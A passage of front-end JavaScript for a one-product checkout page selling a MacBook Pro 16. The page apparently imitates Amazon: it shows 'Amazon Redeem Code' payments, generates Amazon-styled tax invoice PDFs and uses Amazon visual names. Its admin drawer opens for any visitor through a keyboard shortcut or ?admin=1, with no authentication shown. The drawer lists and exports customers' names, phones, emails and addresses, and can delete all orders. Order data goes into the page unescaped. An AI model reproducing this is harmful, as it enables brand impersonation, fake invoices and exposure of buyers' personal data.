  safeSet("confQty", order.quantity || order.qty);
  safeSet("confTotal", isRedeem ? "$0.00 (Paid in Full)" : formatMoney(order.total || order.actualAmount));
  safeSet("confPayMethod", order.paymentMethod);

  const friendBox = document.getElementById("confFriendNoticeBox") || document.getElementById("alertFriendPending");
  const redeemBox = document.getElementById("confRedeemNoticeBox") || document.getElementById("alertRedeemSuccess");
  const payStatus = document.getElementById("confPaymentStatus");

  if (isRedeem) {
    if (friendBox) friendBox.style.display = "none";
    if (redeemBox) redeemBox.style.display = "flex";
    safeSet("confPayMethod", `Redeem Code (${order.redeemCode || ASSIGNED_REDEEM_CODE})`);
    if (payStatus) payStatus.textContent = "Status: Paid in full via Amazon Redeem Code ($0.00 due)";

    // Automatic PDF Download for Redeem Code option
    setTimeout(() => {
      if (typeof window.downloadOrderInvoicePdf === "function") {
        window.downloadOrderInvoicePdf(order);
      } else if (typeof window.generateAmazonInvoicePDF === "function") {
        window.generateAmazonInvoicePDF(order);
      }
    }, 450);
  } else if (order.paymentMethod === "Ask a Friend to Pay") {
    if (friendBox) friendBox.style.display = "flex";
    if (redeemBox) redeemBox.style.display = "none";
    if (payStatus) payStatus.textContent = "Status: Awaiting payment by order sponsor";
  } else {
    if (friendBox) friendBox.style.display = "none";
    if (redeemBox) redeemBox.style.display = "none";
    if (payStatus) payStatus.textContent = "Status: Cash payment on delivery";
  }

  // Setup Download Receipt (PDF) Button
  const btnDownloadReceiptBtn = document.getElementById("btnDownloadReceiptBtn");
  if (btnDownloadReceiptBtn) {
    btnDownloadReceiptBtn.onclick = () => {
      if (typeof window.downloadOrderInvoicePdf === "function") {
        window.downloadOrderInvoicePdf(order);
      } else if (typeof window.openInvoiceModal === "function") {
        window.openInvoiceModal(order);
      } else if (typeof window.generateAmazonInvoicePDF === "function") {
        window.generateAmazonInvoicePDF(order);
      } else {
        showToast("Generating invoice receipt...");
        window.print();
      }
    };
  }

  const btnContinueShopping = document.getElementById("btnContinueShopping");
  if (btnContinueShopping) {
    btnContinueShopping.onclick = () => {
      window.location.href = PATH_PREFIX || "/";
    };
  }

  const btnBackToProductPage = document.getElementById("btnBackToProductPage");
  if (btnBackToProductPage) {
    btnBackToProductPage.onclick = () => {
      if (confScreen) {
        confScreen.style.display = "none";
        confScreen.classList.remove("active");
      }
      if (viewConfirmation) viewConfirmation.style.display = "none";
      if (checkoutGrid) checkoutGrid.style.display = "grid";
      if (viewCheckout) {
        viewCheckout.style.display = "none";
        viewCheckout.classList.remove("active");
      }
      if (viewProductPage) viewProductPage.style.display = "block";
      window.scrollTo({ top: 0, behavior: "smooth" });
    };
  }

  try {
    history.pushState({ view: "confirmation" }, "", "#confirmation");
  } catch (e) {}

  showToast("Order placed successfully! Check your email for confirmation.");
}

// ==========================================================================
//  ADMIN HUB & DRAWER
// ==========================================================================
function setupAdminDrawer() {
  const drawerBackdrop = document.getElementById("drawerBackdrop");
  const ordersDrawer = document.getElementById("ordersDrawer");
  const btnCloseDrawer = document.getElementById("btnCloseDrawer");
  const footerAdminTrigger = document.getElementById("footerAdminTrigger");
  const ordersListContainer = document.getElementById("ordersListContainer");
  const btnExportOrdersCsv = document.getElementById("btnExportOrdersCsv");
  const btnClearAllOrders = document.getElementById("btnClearAllOrders");
  const invoiceModal = document.getElementById("invoiceModalBackdrop");
  const btnCloseInvoiceModal = document.getElementById("btnCloseInvoiceModal");

  if (btnCloseInvoiceModal && invoiceModal) {
    btnCloseInvoiceModal.addEventListener("click", () => {
      invoiceModal.style.display = "none";
    });
    invoiceModal.addEventListener("click", (e) => {
      if (e.target === invoiceModal) invoiceModal.style.display = "none";
    });
  }

  const openDrawer = async () => {
    if (drawerBackdrop) drawerBackdrop.classList.add("open");
    if (ordersDrawer) ordersDrawer.classList.add("open");
    await renderAdminOrders();
  };

  const closeDrawer = () => {
    if (drawerBackdrop) drawerBackdrop.classList.remove("open");
    if (ordersDrawer) ordersDrawer.classList.remove("open");
  };

  if (footerAdminTrigger) footerAdminTrigger.addEventListener("click", openDrawer);
  if (btnCloseDrawer) btnCloseDrawer.addEventListener("click", closeDrawer);
  if (drawerBackdrop) drawerBackdrop.addEventListener("click", closeDrawer);

  // Keyboard shortcut: Alt + S
  document.addEventListener("keydown", (e) => {
    if (e.altKey && (e.key === "s" || e.key === "S")) {
      e.preventDefault();
      openDrawer();
    }
  });

  // Check URL query parameter: ?admin=1
  if (new URLSearchParams(window.location.search).get("admin") === "1") {
    setTimeout(openDrawer, 400);
  }

  async function renderAdminOrders() {
    if (!ordersListContainer) return;
    ordersListContainer.innerHTML = `<div style="text-align:center; padding:30px; color:#666;">Loading recorded orders...</div>`;

    let orders = [];
    try {
      orders = await fetchOrdersFromAPI();
    } catch (e) {}

    if (!orders || !orders.length) {
      orders = getLocalOrders();
    }

    if (!orders || !orders.length) {
      ordersListContainer.innerHTML = `<div style="text-align:center; padding:40px; color:#888;">No customer orders placed yet.</div>`;
      return;
    }

    ordersListContainer.innerHTML = orders.map(ord => `
      <div style="background:#fff; border:1px solid #d5d9d9; border-radius:8px; padding:14px; margin-bottom:12px; font-size:12px;">
        <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:8px;">
          <div>
            <strong style="font-size:14px; color:#0f1111;">${ord.fullName || ord.name}</strong><br>
            <span style="color:#565959;">Order ID: ${ord.orderId}</span> &bull; 
            <span style="color:#007185;">${ord.orderDate || ord.dateStr || ''}</span>
          </div>
          <span style="background:${(ord.paymentMethod === 'Redeem Code' || (ord.payMethod && ord.payMethod.includes('Redeem'))) ? '#007600' : '#e77600'}; color:#fff; padding:3px 8px; border-radius:4px; font-weight:700; font-size:11px;">
            ${ord.paymentMethod || ord.payMethod || 'Order'}
          </span>
        </div>
        <div style="color:#333; line-height:1.5; margin-bottom:8px;">
          <strong>Item:</strong> ${ord.item}<br>
          <strong>Destination:</strong> ${ord.deliveryAddress || ord.address}<br>
          <strong>Phone:</strong> ${ord.phoneNumber || ord.phone || 'N/A'} &bull; <strong>Email:</strong> ${ord.email || 'N/A'}<br>
          <strong>Total:</strong> <span style="font-weight:700; color:var(--price-red);">${ord.price || formatMoney(ord.total || 0)}</span> (Unit: ${formatMoney(ord.unitPrice || 0)} &times; ${ord.quantity || ord.qty || 1})
        </div>
        <div style="display:flex; gap:8px;">
          <button class="btn-order-pdf" data-order-id="${ord.orderId}" style="background:var(--amazon-yellow); border:1px solid #fcd200; padding:4px 10px; border-radius:4px; font-weight:600; cursor:pointer; font-size:11px;">📄 View Tax Invoice</button>
        </div>
      </div>
    `).join("");

    // Attach PDF view handlers
    document.querySelectorAll(".btn-order-pdf").forEach(btn => {
      btn.addEventListener("click", () => {
        const id = btn.getAttribute("data-order-id");
        const match = orders.find(o => o.orderId === id);
        if (match) {
          if (typeof window.downloadOrderInvoicePdf === "function") {
            window.downloadOrderInvoicePdf(match);
          } else if (typeof window.openInvoiceModal === "function") {
            window.openInvoiceModal(match);
          } else if (typeof window.generateAmazonInvoicePDF === "function") {
            window.generateAmazonInvoicePDF(match);
          }
        }
      });
    });
  }

  // Export CSV
  if (btnExportOrdersCsv) {
    btnExportOrdersCsv.addEventListener("click", () => {
      const orders = getLocalOrders();
      if (!orders.length) {
        showToast("No orders available to export.");
        return;
      }
      const headers = ["Order ID", "Date", "Name", "Phone", "Email", "Address", "Item", "Quantity", "Total", "Payment Method"];
      const rows = orders.map(o => [
        `"${o.orderId}"`,
        `"${o.orderDate || o.dateStr || ''}"`,
        `"${o.fullName || o.name}"`,
        `"${o.phoneNumber || o.phone || ''}"`,
        `"${o.email || ''}"`,
        `"${(o.deliveryAddress || o.address || '').replace(/"/g, '""')}"`,
        `"${(o.item || '').replace(/"/g, '""')}"`,
        o.quantity || o.qty || 1,
        o.total || o.actualAmount || 0,
        `"${o.paymentMethod || o.payMethod || ''}"`
      ]);
      const csvContent = "data:text/csv;charset=utf-8," + [headers.join(","), ...rows.map(r => r.join(","))].join("\n");
      const encodedUri = encodeURI(csvContent);
      const link = document.createElement("a");
      link.setAttribute("href", encodedUri);
      link.setAttribute("download", `MacBook_Pro_16_Orders_${new Date().toISOString().slice(0,10)}.csv`);
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    });
  }

  // Clear Orders
  if (btnClearAllOrders) {
    btnClearAllOrders.addEventListener("click", async () => {
      if (confirm("Are you sure you want to clear local order history on this device?")) {
        localStorage.removeItem("macbook_orders_records");
        await deleteOrdersFromAPI();
        renderAdminOrders();
        showToast("Local orders cleared.");
      }
    });
  }
}

// Toast helper
function showToast(msg) {
  const toast = document.getElementById("amazonToast");
  if (!toast) return;
  toast.textContent = msg;
  toast.style.display = "block";
  toast.style.opacity = "1";
  setTimeout(() => {
    toast.style.opacity = "0";
    setTimeout(() => {
      toast.style.display = "none";
    }, 300);
  }, 3200);
}

// ==========================================================================
//  BOOTSTRAP ON DOM LOAD
// ==========================================================================
document.addEventListener("DOMContentLoaded", () => {
  setupProductSelectors();
  updateRamButtonsForChip();
  updateProductDetails();
  setupCheckoutAccordion();
  setupAdminDrawer();

  // Buy Now button transitions to Checkout view
  const btnBuyNow = document.getElementById("btnBuyNow");
  const viewProductPage = document.getElementById("viewProductPage");
  const viewCheckout = document.getElementById("viewCheckout");
  const chBackToProduct = document.getElementById("chBackToProduct");

  const openCheckout = () => {
    if (viewProductPage) viewProductPage.style.display = "none";
    if (viewCheckout) {
      viewCheckout.style.display = "block";
      viewCheckout.classList.add("active");
    }
    const checkoutGrid = document.getElementById("checkoutGridArea");
    if (checkoutGrid) checkoutGrid.style.display = "grid";
    const confScreen = document.getElementById("orderConfirmationScreen");
    if (confScreen) {
      confScreen.classList.remove("active");
      confScreen.style.display = "none";
    }
    syncOrderSummary();
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const returnToProduct = () => {
    if (viewCheckout) {
      viewCheckout.style.display = "none";
      viewCheckout.classList.remove("active");
    }
    const confScreen = document.getElementById("orderConfirmationScreen");
    if (confScreen) {
      confScreen.classList.remove("active");
      confScreen.style.display = "none";
    }
    if (viewProductPage) viewProductPage.style.display = "block";
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  if (btnBuyNow) {
    btnBuyNow.addEventListener("click", () => {
      openCheckout();
      try { history.pushState({ view: "checkout" }, "", "#checkout"); } catch (e) {}
    });
  }

  if (chBackToProduct) {
    chBackToProduct.addEventListener("click", () => {
      returnToProduct();
      try { history.pushState({ view: "product" }, "", window.location.pathname); } catch (e) {}
    });
  }

  // Handle URL hash navigation
  if (window.location.hash === "#checkout") {
    openCheckout();
  }

  window.addEventListener("popstate", (e) => {
    if (window.location.hash === "#checkout") {
      openCheckout();
    } else if (window.location.hash === "#confirmation") {
      // Stay on confirmation
    } else {
      returnToProduct();
    }
  });
});
